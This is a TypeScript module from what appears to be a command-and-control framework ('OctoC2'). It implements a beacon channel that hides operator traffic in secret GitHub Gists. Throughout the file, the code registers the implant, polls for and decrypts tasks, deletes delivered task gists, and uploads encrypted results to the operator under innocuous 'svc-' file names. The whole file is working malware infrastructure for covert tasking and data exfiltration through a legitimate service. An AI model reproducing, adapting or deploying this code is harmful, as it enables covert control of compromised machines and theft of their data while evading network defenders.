/**
 * OctoC2 — GistTentacle (Tentacle 6 — Gist storage channel)
 *
 * Uses GitHub Gists (secret) as an invisible storage channel.
 * Secret gists are not indexed by search engines and require auth to access.
 *
 * Gist layout (all secret gists, one file per gist):
 *   svc-a-{id8}.json  —  Beacon → Server  ACK / registration payload
 *   svc-t-{id8}.json  —  Server → Beacon  Encrypted Task[] blob
 *   svc-r-{id8}.json  —  Beacon → Server  Sealed TaskResult blob
 *
 * Crypto:
 *   Incoming tasks (server → beacon): crypto_box (operator secret + beacon public)
 *   Outgoing results (beacon → server): crypto_box_seal (operator public key)
 */

import { BaseTentacle } from "./BaseTentacle.ts";
import { ExplicitFineGrainedTokenProvider } from "../lib/GitHubTokenProvider.ts";
import {
  decryptBox, sealBox,
} from "../crypto/sodium.ts";
import type {
  CheckinPayload,
  Task,
  TaskResult,
  ResultSubmissionOutcome,
} from "../types.ts";

export class GistTentacle extends BaseTentacle {
  readonly kind = "gist" as const;

  constructor(config: import("../types.ts").BeaconConfig) {
    const gistToken = config.gistToken?.trim();
    super(
      config,
      gistToken
        ? new ExplicitFineGrainedTokenProvider(gistToken)
        : undefined,
    );
  }

  private ackGistId: string | null = null;
  private taskGistId: string | null = null;
  private lastTaskUpdatedAt: string | null = null;

  // ── Filename helpers ─────────────────────────────────────────────────────────

  private get id8(): string { return this.config.id.slice(0, 8); }

  private get ackFilename(): string    { return `svc-a-${this.id8}.json`; }
  private get taskFilename(): string   { return `svc-t-${this.id8}.json`; }
  private get resultFilename(): string { return `svc-r-${this.id8}.json`; }

  // ── Availability ─────────────────────────────────────────────────────────────

  override async isAvailable(): Promise<boolean> {
    try {
      await this.octokit.rest.gists.list({ per_page: 1 });
      return true;
    } catch {
      return false;
    }
  }

  // ── Operator key resolution ───────────────────────────────────────────────────

  private async getOperatorPublicKey(): Promise<Uint8Array> {
    if (this.config.operatorPublicKey.length !== 32) {
      throw new Error("GistTentacle: provisioned operator public key is not 32 bytes");
    }
    return this.config.operatorPublicKey;
  }

  // ── Checkin ──────────────────────────────────────────────────────────────────

  async checkin(payload: CheckinPayload): Promise<Task[]> {
    if (!payload.identity) {
      throw new Error("GistTentacle: signed checkin identity is required");
    }

    // List once per cycle so ACK reuse and task discovery share one request.
    const listResp = await this.octokit.rest.gists.list({ per_page: 100 });
    const listedAckGist = listResp.data.find(
      (g: any) => g.files && g.files[this.ackFilename],
    );
    if (!this.ackGistId && listedAckGist) {
      this.ackGistId = listedAckGist.id;
    }

    // Refresh one reusable ACK gist before every task poll.
    const ackContent = JSON.stringify(payload);
    if (this.ackGistId) {
      try {
        await this.octokit.rest.gists.update({
          gist_id: this.ackGistId,
          files: {
            [this.ackFilename]: { content: ackContent },
          },
        } as any);
      } catch (err: any) {
        if (err?.status !== 404) throw err;
        this.ackGistId = null;
      }
    }
    if (!this.ackGistId) {
      const ackResp = await this.octokit.rest.gists.create({
        public: false,
        files: {
          [this.ackFilename]: { content: ackContent },
        },
      } as any);
      this.ackGistId = ackResp.data.id ?? null;
    }

    let operatorPubKey: Uint8Array;
    try {
      operatorPubKey = await this.getOperatorPublicKey();
    } catch {
      return [];
    }

    // 2. Poll for task gist
    const taskGist = listResp.data.find(
      (g: any) => g.files && g.files[this.taskFilename]
    );

    if (!taskGist) {
      this.taskGistId = null;
      this.lastTaskUpdatedAt = null;
      return [];
    }

    this.taskGistId = taskGist.id;

    // 3. Change detector — use updated_at as a simple version stamp
    const updatedAt: string = (taskGist as any).updated_at ?? "";
    if (updatedAt === this.lastTaskUpdatedAt) return [];
    this.lastTaskUpdatedAt = updatedAt;

    // 4. Fetch full gist content
    let rawContent: string;
    try {
      const fullResp = await this.octokit.rest.gists.get({ gist_id: this.taskGistId });
      const fileEntry = (fullResp.data as any).files?.[this.taskFilename];
      rawContent = fileEntry?.content ?? "";
      if (!rawContent) return [];
    } catch {
      return [];
    }

    // 5. Decrypt
    let tasks: Task[];
    try {
      const envelope = JSON.parse(rawContent) as { nonce: string; ciphertext: string };
      const plainBytes = await decryptBox(
        envelope.ciphertext,
        envelope.nonce,
        operatorPubKey,
        this.config.beaconKeyPair.secretKey,
      );
      tasks = JSON.parse(new TextDecoder().decode(plainBytes)) as Task[];
    } catch {
      return [];
    }

    // 6. Delete the task gist (prevents re-delivery)
    try {
      await this.octokit.rest.gists.delete({ gist_id: this.taskGistId });
      this.taskGistId = null;
      this.lastTaskUpdatedAt = null;
    } catch { /* best-effort */ }

    return tasks;
  }

  // ── Submit result ────────────────────────────────────────────────────────────

  async submitResult(result: TaskResult): Promise<ResultSubmissionOutcome> {
    const operatorPubKey = await this.getOperatorPublicKey();

    const sealed = await sealBox(JSON.stringify(result), operatorPubKey);
    await this.octokit.rest.gists.create({
      public: false,
      files: {
        [this.resultFilename]: { content: sealed },
      },
    } as any);
    return {
      artifactWritten: true,
      controllerAccepted: false,
      channel: "gist",
      acceptance: null,
    };
  }

  // ── Teardown ─────────────────────────────────────────────────────────────────

  override async teardown(): Promise<void> {
    // Preserve registration and unread task gists across recovery rebuilds.
  }
}
